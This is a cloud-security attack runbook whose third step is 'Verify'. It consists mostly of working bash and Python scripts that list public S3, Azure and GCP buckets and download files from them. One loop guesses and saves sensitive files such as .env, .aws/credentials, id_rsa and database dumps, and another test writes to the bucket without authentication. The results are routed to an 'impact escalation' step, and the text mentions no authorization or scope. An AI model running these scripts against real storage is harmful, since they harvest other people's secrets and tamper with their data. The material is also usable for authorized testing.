# Cloud Security — Runbook 03: Verify

## Purpose
Confirm with high confidence a cloud storage resource is exploitable. Verify listing, read, and write capabilities on S3/Azure/GCP.

## Variables
- `$TARGET_URL` — base URL
- `$OUTDIR` — output directory
- `$BUCKET_NAME` — specific bucket name
- `$EVIDENCE_DIR` — evidence directory

---

## W3.1 — Verify S3 public listing + file access

```bash
BUCKET="$BUCKET_NAME"
EVIDENCE_DIR="$OUTDIR/cloud/evidence"
mkdir -p "$EVIDENCE_DIR"

# Full listing with XML parsing
curl -s "https://$BUCKET.s3.amazonaws.com" -o "$EVIDENCE_DIR/s3-full-listing.xml"

echo "=== Listing contents for $BUCKET ==="
python3 -c "
import xml.etree.ElementTree as ET
tree = ET.parse('$EVIDENCE_DIR/s3-full-listing.xml')
root = tree.getroot()
ns = {'s3': 'http://s3.amazonaws.com/doc/2006-03-01/'}
for content in root.findall('.//s3:Contents', ns):
    key = content.find('s3:Key', ns).text
    size = content.find('s3:Size', ns).text
    modified = content.find('s3:LastModified', ns).text
    print(f'{key} ({size} bytes, {modified})')
" 2>/dev/null

# Download a sample file to verify read access
SAMPLE_FILE=$(python3 -c "
import xml.etree.ElementTree as ET
tree = ET.parse('$EVIDENCE_DIR/s3-full-listing.xml')
root = tree.getroot()
ns = {'s3': 'http://s3.amazonaws.com/doc/2006-03-01/'}
keys = [c.find('s3:Key', ns).text for c in root.findall('.//s3:Contents', ns) if int(c.find('s3:Size', ns).text) < 1024*1024]
print(keys[0] if keys else '')
" 2>/dev/null)

if [ -n "$SAMPLE_FILE" ]; then
  curl -s "https://$BUCKET.s3.amazonaws.com/$SAMPLE_FILE" \
    -o "$EVIDENCE_DIR/sample-$SAMPLE_FILE"
  echo "=== Sample file: $SAMPLE_FILE ==="
  head -c 500 "$EVIDENCE_DIR/sample-$SAMPLE_FILE" 2>/dev/null
fi
```

## W3.2 — Verify bucket accessible but not listable (file guessing)

```bash
BUCKET="$BUCKET_NAME"

# Try common file paths
for path in \
  "index.html" "robots.txt" ".env" "wp-config.php" \
  "backup.zip" "database.sql" "dump.sql" \
  ".git/config" ".aws/credentials" \
  "config.json" "credentials.json" "secrets.yml" \
  "private_key.pem" "id_rsa"; do
  code=$(curl -s -o /dev/null -w "%{http_code}" \
    "https://$BUCKET.s3.amazonaws.com/$path" 2>/dev/null)
  if [ "$code" = "200" ]; then
    echo "ACCESSIBLE: $path (HTTP $code)"
    curl -s "https://$BUCKET.s3.amazonaws.com/$path" \
      -o "$EVIDENCE_DIR/$path" 2>/dev/null
  fi
done > "$EVIDENCE_DIR/file-guessing-results.txt"

echo "=== Accessible files on non-listable bucket ==="
cat "$EVIDENCE_DIR/file-guessing-results.txt"
```

## W3.3 — Verify writable S3 bucket

```bash
BUCKET="$BUCKET_NAME"

# SAFE test: Write a harmless text file
echo "security-test-$(date -u +%s)" > "$EVIDENCE_DIR/test-file.txt"

WRITE_RESULT=$(curl -s -X PUT \
  "https://$BUCKET.s3.amazonaws.com/security-test-file.txt" \
  -H "Content-Type: text/plain" \
  --data-binary "@$EVIDENCE_DIR/test-file.txt" \
  -w "%{http_code}" -o /dev/null 2>/dev/null)

echo "Write test result: HTTP $WRITE_RESULT"

if [ "$WRITE_RESULT" = "200" ]; then
  echo "BUCKET IS WRITABLE: $BUCKET"
  # Verify the file was written
  VERIFY=$(curl -s "https://$BUCKET.s3.amazonaws.com/security-test-file.txt" 2>/dev/null)
  echo "Content written: $VERIFY"
fi
```

## W3.4 — Verify Azure blob public access

```bash
AZURE_STORAGE="$BUCKET_NAME"

# Get full container list
curl -s "https://$AZURE_STORAGE.blob.core.windows.net/?comp=list" \
  -o "$EVIDENCE_DIR/azure-container-list.xml" 2>/dev/null

python3 -c "
import xml.etree.ElementTree as ET
tree = ET.parse('$EVIDENCE_DIR/azure-container-list.xml')
root = tree.getroot()
for container in root.findall('.//Container'):
    name = container.find('Name').text
    print(f'Container: {name}')
" 2>/dev/null
```

## W3.5 — Verify GCP bucket public access

```bash
GCP_BUCKET="$BUCKET_NAME"

# Full listing
curl -s "https://storage.googleapis.com/storage/v1/b/$GCP_BUCKET/o?maxResults=50" \
  -o "$EVIDENCE_DIR/gcp-full-listing.json" 2>/dev/null

python3 -c "
import json
data = json.load(open('$EVIDENCE_DIR/gcp-full-listing.json'))
for item in data.get('items', []):
    print(f\"{item['name']} ({item.get('size','?')} bytes)\")
" 2>/dev/null
```

---

## Stop Conditions

| Condition | Reason |
|---|---|
| HTTP 404 on all region variants | Bucket does not exist |
| HTTP 403 with no listing, all guessed files return 403 | Private and secure |
| HTTP 200 but no interesting files (only public web assets) | Intentionally public -- low impact |
| Write test returns 403 | Not writable (but listable/readable may still be a finding) |

---

## Next Routing

| Result | Route |
|---|---|
| Public listing with sensitive files (env, config, DB, keys) | -> 04-impact-escalation.md |
| Bucket writable (can upload arbitrary content) | -> 04-impact-escalation.md |
| Public listing but only public web assets | -> Still document; low severity |
| Bucket exists but fully private | -> Document as no finding |

---

## Output Files

| File | Contents |
|---|---|
| $EVIDENCE_DIR/s3-full-listing.xml | Complete S3 bucket listing |
| $EVIDENCE_DIR/sample-* | Sample file download from bucket |
| $EVIDENCE_DIR/file-guessing-results.txt | Results of common file guessing |
| $EVIDENCE_DIR/azure-container-list.xml | Azure container listing |
| $EVIDENCE_DIR/gcp-full-listing.json | GCP bucket object listing |
| $EVIDENCE_DIR/test-file.txt | Test file used for write verification |
